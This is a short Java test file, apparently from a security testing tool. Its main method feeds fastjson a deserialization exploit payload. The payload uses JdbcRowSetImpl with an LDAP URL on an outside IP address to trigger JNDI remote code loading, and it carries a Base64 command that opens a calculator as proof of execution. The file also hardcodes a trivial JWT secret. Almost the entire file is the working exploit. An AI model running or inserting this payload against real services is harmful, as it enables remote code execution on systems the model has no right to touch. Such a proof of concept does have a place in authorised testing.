package jrcet;




import com.alibaba.fastjson.JSON;

import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;
import javax.swing.*;
import java.awt.event.KeyEvent;

public class test {
    private static final String Jwt_Secret = "111111111111111111111111";

    public static void main(String[] args) throws Exception {
        JSON.parse("{\n" +
                "    \"1\": {\n" +
                "        \"@type\": \"java.lang.Class\", \n" +
                "        \"val\": \"com.sun.rowset.JdbcRowSetImpl\"\n" +
                "    }, \n" +
                "    \"2\": {\n" +
                "        \"@type\": \"com.sun.rowset.JdbcRowSetImpl\", \n" +
                "        \"dataSourceName\": \"ldap://42.192.228.137:1389/Basic/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA==\", \n" +
                "        \"autoCommit\": true\n" +
                "    }\n" +
                "}");

    }

}
